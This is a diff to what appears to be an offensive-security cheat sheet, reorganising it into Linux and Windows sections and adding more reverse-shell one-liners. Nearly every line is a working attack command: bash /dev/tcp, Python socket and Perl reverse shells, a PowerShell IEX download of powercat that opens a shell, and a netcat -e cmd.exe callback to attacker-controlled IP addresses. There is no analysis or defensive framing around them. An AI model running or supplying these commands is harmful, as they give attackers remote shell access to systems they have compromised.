@@ -1,4 +1,6 @@
-### Making webshell stable
+### Linux
+
+##### Making webshell stable
 python -c 'import pty; pty.spawn("/bin/bash")'
 OR
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -9,6 +11,9 @@ Ctrl + Z [Background Process]
 stty raw -echo ; fg ; reset
 stty columns 200 rows 200
 
+Bash:
+bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+
 Python:
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234)); //Change IP and Port
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -17,5 +22,10 @@ Perl:
 sudo perl -e 'use Socket;$i="192.168.45.5";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 
+### Windows
+
 Powershell:
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
+
+Netcat:
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
